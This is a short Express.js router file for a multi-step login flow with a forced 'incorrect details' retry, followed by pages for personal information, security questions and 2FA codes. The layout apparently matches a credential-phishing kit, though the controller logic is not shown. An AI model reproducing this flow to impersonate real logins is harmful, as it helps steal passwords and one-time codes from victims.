const express = require('express');
const router =  express.Router();
const controller = require('../controllers/controller');

// Initial Login
router.get('/auth/login', controller.login);
router.post('/auth/login/attempt', controller.loginPost);

// Incorrect Details Handling
router.get('/auth/login/incorrect', controller.login2);
router.post('/auth/login/retry', controller.loginPost2);

// Verify Information
router.get('/auth/login/verify-info', controller.login3);
router.post('/auth/login/verify-info', controller.loginPost3);

// Security Questions
router.get('/auth/login/identity-verification', controller.login4);
router.post('/auth/login/identity-verification', controller.loginPost4);

// Two-Factor Authentication (2FA)
router.get('/auth/login/2fa', controller.login5);
router.post('/auth/login/2fa', controller.loginPost5);

// Completion
router.get('/auth/login/complete', controller.complete);

router.get('*', controller.page404Redirect);

module.exports = router;